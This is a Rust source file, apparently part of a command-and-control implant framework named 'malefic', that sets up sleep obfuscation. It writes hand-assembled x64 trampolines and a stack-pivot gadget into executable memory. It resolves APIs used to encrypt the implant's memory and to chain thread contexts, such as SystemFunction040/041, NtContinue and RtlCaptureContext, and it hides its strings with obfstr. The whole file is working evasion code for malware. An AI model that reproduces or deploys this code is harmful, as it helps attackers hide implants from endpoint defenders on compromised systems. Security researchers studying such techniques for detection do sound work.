#![allow(non_snake_case)]

use core::ptr::null_mut;
use std::sync::OnceLock;

use anyhow::{bail, Result};
use malefic_gateway::obfstr::obfstr as s;

use crate::kit::apis::{m_get_proc_address, m_load_library_a};
use crate::sleep::types::*;
use crate::sleep::winapis::*;

// ── Global configuration ─────────────────────────────────────────────

static CONFIG: OnceLock<Result<Config, String>> = OnceLock::new();

/// Lazily initializes and returns a singleton Config instance.
#[inline]
pub fn init_config() -> Result<&'static Config> {
    let result = CONFIG.get_or_init(|| Config::new().map_err(|e| format!("{}", e)));
    match result {
        Ok(cfg) => Ok(cfg),
        Err(e) => bail!("{}", e),
    }
}

// ── Config ───────────────────────────────────────────────────────────

#[derive(Default, Debug, Clone, Copy)]
pub struct Config {
    pub callback: u64,
    pub trampoline: u64,
    pub gadget_rbp: u64,
    pub modules: Modules,
    pub wait_for_single: WinApi,
    pub system_function040: WinApi,
    pub system_function041: WinApi,
    pub nt_continue: WinApi,
    pub nt_set_event: WinApi,
    pub nt_protect_virtual_memory: WinApi,
    pub rtl_exit_user_thread: WinApi,
    pub nt_wait_for_single: WinApi,
    pub rtl_capture_context: WinApi,
    pub nt_test_alert: WinApi,
}

impl Config {
    pub fn new() -> Result<Self> {
        let modules = Self::modules();
        let mut cfg = Self::resolve_apis(modules);
        cfg.callback = Self::alloc_callback()?;
        cfg.trampoline = Self::alloc_trampoline()?;
        cfg.gadget_rbp = Self::alloc_gadget_rbp()?;
        Ok(cfg)
    }

    /// Allocates executable memory used as a callback trampoline in thread pool callbacks.
    /// The trampoline reads CONTEXT.Rax and jumps to it:
    ///   mov rcx, rdx          ; 48 89 D1
    ///   mov rax, [rcx+0x78]   ; 48 8B 41 78  (CONTEXT.Rax offset = 0x78)
    ///   jmp rax               ; FF E0
    pub fn alloc_callback() -> Result<u64> {
        let callback: &[u8] = &[
            0x48, 0x89, 0xD1, // mov rcx, rdx
            0x48, 0x8B, 0x41, 0x78, // mov rax, QWORD PTR [rcx+0x78]
            0xFF, 0xE0, // jmp rax
        ];

        let mut size = callback.len();
        let mut addr = null_mut();
        if !nt_success(NtAllocateVirtualMemory(
            nt_current_process(),
            &mut addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )) {
            bail!(s!("failed to allocate callback memory").to_string());
        }

        unsafe {
            core::ptr::copy_nonoverlapping(callback.as_ptr(), addr as *mut u8, callback.len());
        }

        let mut old_protect = 0u32;
        if !nt_success(NtProtectVirtualMemory(
            nt_current_process(),
            &mut addr,
            &mut size,
            PAGE_EXECUTE_READ as u32,
            &mut old_protect,
        )) {
            bail!(s!("failed to change callback memory protection").to_string());
        }

        NtLockVirtualMemory(nt_current_process(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates trampoline memory for RtlCaptureContext execution.
    /// Thread pool passes the parameter in RDX, not RCX. The trampoline
    /// moves RDX to RCX and jumps to [RCX] (CONTEXT.P1Home = RtlCaptureContext).
    ///   mov rcx, rdx  ; 48 89 D1
    ///   xor rdx, rdx  ; 48 31 D2
    ///   jmp [rcx]     ; FF 21
    pub fn alloc_trampoline() -> Result<u64> {
        let trampoline: &[u8] = &[
            0x48, 0x89, 0xD1, // mov rcx, rdx
            0x48, 0x31, 0xD2, // xor rdx, rdx
            0xFF, 0x21, // jmp QWORD PTR [rcx]
        ];

        let mut size = trampoline.len();
        let mut addr = null_mut();
        if !nt_success(NtAllocateVirtualMemory(
            nt_current_process(),
            &mut addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )) {
            bail!(s!("failed to allocate trampoline memory").to_string());
        }

        unsafe {
            core::ptr::copy_nonoverlapping(trampoline.as_ptr(), addr as *mut u8, trampoline.len());
        }

        let mut old_protect = 0u32;
        if !nt_success(NtProtectVirtualMemory(
            nt_current_process(),
            &mut addr,
            &mut size,
            PAGE_EXECUTE_READ as u32,
            &mut old_protect,
        )) {
            bail!(s!("failed to change trampoline memory protection").to_string());
        }

        NtLockVirtualMemory(nt_current_process(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates executable memory for the `mov rsp, rbp; ret` gadget.
    /// This gadget restores the stack pointer after each CONTEXT chain step,
    /// allowing the thread to return cleanly to the threadpool dispatch loop.
    ///   mov rsp, rbp  ; 48 89 EC
    ///   ret           ; C3
    pub fn alloc_gadget_rbp() -> Result<u64> {
        let gadget: &[u8] = &[
            0x48, 0x89, 0xEC, // mov rsp, rbp
            0xC3, // ret
        ];

        let mut size = gadget.len();
        let mut addr = null_mut();
        if !nt_success(NtAllocateVirtualMemory(
            nt_current_process(),
            &mut addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )) {
            bail!(s!("failed to allocate gadget_rbp memory").to_string());
        }

        unsafe {
            core::ptr::copy_nonoverlapping(gadget.as_ptr(), addr as *mut u8, gadget.len());
        }

        let mut old_protect = 0u32;
        if !nt_success(NtProtectVirtualMemory(
            nt_current_process(),
            &mut addr,
            &mut size,
            PAGE_EXECUTE_READ as u32,
            &mut old_protect,
        )) {
            bail!(s!("failed to change gadget_rbp memory protection").to_string());
        }

        NtLockVirtualMemory(nt_current_process(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Resolves the base addresses of key Windows modules.
    fn modules() -> Modules {
        unsafe {
            let ntdll = m_load_library_a(s!("ntdll.dll\0").as_ptr());
            let kernel32 = m_load_library_a(s!("kernel32.dll\0").as_ptr());
            let kernelbase = m_load_library_a(s!("kernelbase.dll\0").as_ptr());

            // Try CryptBase.dll first, fall back to advapi32.dll
            let mut cryptbase = m_load_library_a(s!("CryptBase.dll\0").as_ptr());
            if cryptbase.is_null() {
                cryptbase = m_load_library_a(s!("advapi32.dll\0").as_ptr());
            }

            Modules {
                ntdll: Dll::from(ntdll),
                kernel32: Dll::from(kernel32),
                cryptbase: Dll::from(cryptbase),
                kernelbase: Dll::from(kernelbase),
            }
        }
    }

    /// Resolves API function addresses from loaded modules.
    fn resolve_apis(modules: Modules) -> Self {
        let ntdll = modules.ntdll.as_ptr();
        let kernel32 = modules.kernel32.as_ptr();
        let cryptbase = modules.cryptbase.as_ptr();

        unsafe {
            Self {
                modules,
                wait_for_single: WinApi::from(m_get_proc_address(
                    kernel32,
                    s!("WaitForSingleObject\0").as_ptr(),
                )),
                system_function040: WinApi::from(m_get_proc_address(
                    cryptbase,
                    s!("SystemFunction040\0").as_ptr(),
                )),
                system_function041: WinApi::from(m_get_proc_address(
                    cryptbase,
                    s!("SystemFunction041\0").as_ptr(),
                )),
                nt_continue: WinApi::from(m_get_proc_address(ntdll, s!("NtContinue\0").as_ptr())),
                nt_set_event: WinApi::from(m_get_proc_address(ntdll, s!("NtSetEvent\0").as_ptr())),
                nt_protect_virtual_memory: WinApi::from(m_get_proc_address(
                    ntdll,
                    s!("NtProtectVirtualMemory\0").as_ptr(),
                )),
                rtl_exit_user_thread: WinApi::from(m_get_proc_address(
                    ntdll,
                    s!("RtlExitUserThread\0").as_ptr(),
                )),
                nt_wait_for_single: WinApi::from(m_get_proc_address(
                    ntdll,
                    s!("NtWaitForSingleObject\0").as_ptr(),
                )),
                rtl_capture_context: WinApi::from(m_get_proc_address(
                    ntdll,
                    s!("RtlCaptureContext\0").as_ptr(),
                )),
                nt_test_alert: WinApi::from(m_get_proc_address(
                    ntdll,
                    s!("NtTestAlert\0").as_ptr(),
                )),
                ..Default::default()
            }
        }
    }
}
